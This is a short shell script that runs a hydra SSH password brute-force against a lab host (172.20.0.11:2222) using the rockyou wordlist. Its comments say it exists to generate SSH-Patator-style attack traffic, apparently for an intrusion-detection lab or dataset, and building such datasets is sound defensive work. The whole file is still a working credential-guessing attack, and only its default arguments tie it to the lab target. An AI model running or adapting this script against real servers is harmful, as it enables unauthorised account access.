#!/bin/sh
# ssh_bruteforce.sh — SSH brute-force against victim_ssh (172.20.0.11:2222)
# Generates SSH-Patator-style flows: many short TCP connections, psh_flag_ratio > 0.
TARGET=${1:-172.20.0.11}
PORT=${2:-2222}
WORDLIST=${3:-/usr/share/wordlists/rockyou.txt}
USER=${4:-testuser}
echo "[attack] SSH brute-force → $USER@$TARGET:$PORT  (wordlist: $WORDLIST)"
hydra -l "$USER" -P "$WORDLIST" -s "$PORT" -t 4 ssh://"$TARGET"
